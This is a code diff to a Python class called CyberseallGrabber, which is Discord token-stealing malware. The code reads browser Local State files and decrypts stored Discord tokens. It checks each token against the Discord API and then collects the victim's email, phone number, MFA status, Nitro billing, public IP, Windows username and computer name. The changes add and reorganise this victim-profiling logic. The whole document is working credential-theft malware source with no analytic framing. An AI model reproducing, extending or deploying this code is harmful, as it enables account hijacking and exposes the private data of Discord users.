@@ -47,6 +47,15 @@ class CyberseallGrabber:
                 except:
                     return "Error"
             
+            def getip():
+                ip = "None"
+                try:
+                    import urllib.request
+                    ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
+                except: 
+                    pass
+                return ip
+            
             tokens = []
             cleaned = []
             checker = []
@@ -82,7 +91,7 @@ class CyberseallGrabber:
             }
             
             for platform, path in paths.items():
-                if not os.path.exists(path): 
+                if not os.path.exists(path):
                     continue
                 try:
                     with open(path + f"\\Local State", "r") as file:
@@ -107,34 +116,26 @@ class CyberseallGrabber:
                     except PermissionError: 
                         continue
             
-
             for i in tokens:
                 if i.endswith("\\"):
                     i = i.replace("\\", "")
                 if i not in cleaned:
                     cleaned.append(i)
             
-
             for token in cleaned:
                 try:
-                    if 'dQw4w9WgXcQ:' in token:
-                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
-                        if tok != "Error" and len(tok) > 50:
-                            checker.append(tok)
+                    tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
+                    if tok != "Error":
+                        checker.append(tok)
                 except:
                     continue
             
-
             for value in checker:
                 if value not in already_check:
                     already_check.append(value)
-                    headers = {'Authorization': value, 'Content-Type': 'application/json'}
+                    headers = {'Authorization': value, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                     try:
-
-                        res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
-                        if res.status_code != 200:
-                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
-                        
+                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                         if res.status_code == 200:
                             self.t.append(value)
                     except:
@@ -149,22 +150,29 @@ class CyberseallGrabber:
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                 
-
-                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
-                if r.status_code != 200:
-                    r = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
+                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                 
-                if r.status_code == 200:
-                    user_data = r.json()
+                if res.status_code == 200:
+                    res_json = res.json()
+                    
+                    try:
+                        import urllib.request
+                        ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
+                    except:
+                        ip = "None"
+                    
+                    pc_username = os.getenv("UserName", "Unknown")
+                    pc_name = os.getenv("Computername", "Unknown")
+                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
+                    user_id = res_json['id']
+                    email = res_json['email']
+                    phone = res_json['phone']
+                    mfa_enabled = res_json['mfa_enabled']
                     
                     has_nitro = False
                     days_left = 0
                     try:
-
-                        nitro_res = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
-                        if nitro_res.status_code != 200:
-                            nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
-                        
+                        nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
                         if nitro_res.status_code == 200:
                             nitro_data = nitro_res.json()
                             has_nitro = bool(len(nitro_data) > 0)
@@ -176,33 +184,23 @@ class CyberseallGrabber:
                     except:
                         pass
                     
-
-                    try:
-                        import socket
-                        ip = "None"
-                        try:
-                            import urllib.request
-                            ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
-                        except:
-                            ip = socket.gethostbyname(socket.gethostname())
-                    except:
-                        ip = "None"
-                    
                     token_info = {
                         'token': token,
-                        'username': user_data.get('username', 'Unknown'),
-                        'discriminator': user_data.get('discriminator', '0000'),
-                        'id': user_data.get('id', 'Unknown'),
-                        'email': user_data.get('email', 'Hidden'),
-                        'phone': user_data.get('phone', 'None'),
-                        'verified': user_data.get('verified', False),
-                        'mfa_enabled': user_data.get('mfa_enabled', False),
-                        'premium_type': user_data.get('premium_type', 0),
+                        'username': res_json.get('username', 'Unknown'),
+                        'discriminator': res_json.get('discriminator', '0000'),
+                        'id': user_id,
+                        'email': email,
+                        'phone': phone,
+                        'verified': res_json.get('verified', False),
+                        'mfa_enabled': mfa_enabled,
+                        'premium_type': res_json.get('premium_type', 0),
                         'has_nitro': has_nitro,
                         'nitro_days_left': days_left,
                         'ip': ip,
-                        'pc_username': os.getenv("UserName", "Unknown"),
-                        'pc_name': os.getenv("Computername", "Unknown")
+                        'pc_username': pc_username,
+                        'pc_name': pc_name,
+                        'user_name': user_name,
+                        'platform': 'Discord'
                     }
                     valid_tokens.append(token_info)
             except:
